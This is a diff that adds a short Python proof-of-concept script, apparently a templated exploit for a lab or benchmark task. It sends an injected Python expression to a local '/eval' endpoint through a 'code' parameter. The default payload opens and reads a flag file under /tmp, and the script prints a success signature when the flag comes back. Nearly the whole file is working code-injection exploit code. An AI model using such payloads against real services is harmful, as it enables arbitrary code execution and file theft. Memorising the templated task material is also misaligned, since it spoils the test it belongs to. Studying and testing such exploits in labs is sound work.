@@ -1,0 +1,36 @@
+import argparse
+import sys
+import requests
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_PAYLOAD = "open('/tmp/code-injection-flag.txt', 'r', encoding='utf-8').read()"
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + '/eval'
+    try:
+        resp = requests.get(url, params={'code': payload}, timeout=5)
+        resp.raise_for_status()
+    except requests.RequestException as exc:
+        print(f'[codei-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = resp.json()
+    except ValueError:
+        return False
+    return str(payload.get('ok')) == 'True' and str(payload.get('result')) == FLAG_TOKEN
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Code Injection compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[codei-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
